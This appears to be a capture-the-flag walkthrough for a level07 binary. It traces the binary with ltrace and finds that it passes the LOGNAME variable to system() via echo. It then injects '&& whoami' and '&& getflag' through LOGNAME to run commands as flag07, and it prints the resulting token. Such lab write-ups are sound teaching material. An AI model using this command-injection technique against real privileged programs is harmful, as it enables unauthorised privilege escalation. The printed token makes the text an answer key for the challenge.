In the folder **home** we find a binary ./level07, which, if we launch it, displays a message :
<pre><code>> ./level07
level07</code></pre>

We want to know what the binary does, so we use **ltrace** :
<pre><code>> ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620
getegid()= 2007
geteuid()= 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)= 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)= 0
getenv("LOGNAME")= "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff62, 0xb7e5ee55, 0xb7fed280)= 18
system("/bin/echo level07 "level07
--- SIGCHLD (Child exited) ---
<... system resumed> )= 0
+++ exited (status 0) +++
</code></pre>

We observe that the binary makes a **getenv** and calls **system** to make a **echo**

We make a <code>env</code> to see the varibal **LOGNAME** :
<pre><code>> env
...
LOGNAME=level07
...
</code></pre>

We try to make an injection with a <code>whoami</code> to check that the injection works, but also to know the rights with which the binary is launched

<pre><code>> LOGNAME="&& whoami"
> ./level07
flag07
</code></pre>

> We observe **flag07**, which means that we can make a **getflag**

<pre><code>> LOGNAME="&& getflag"
> ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
</code></pre>

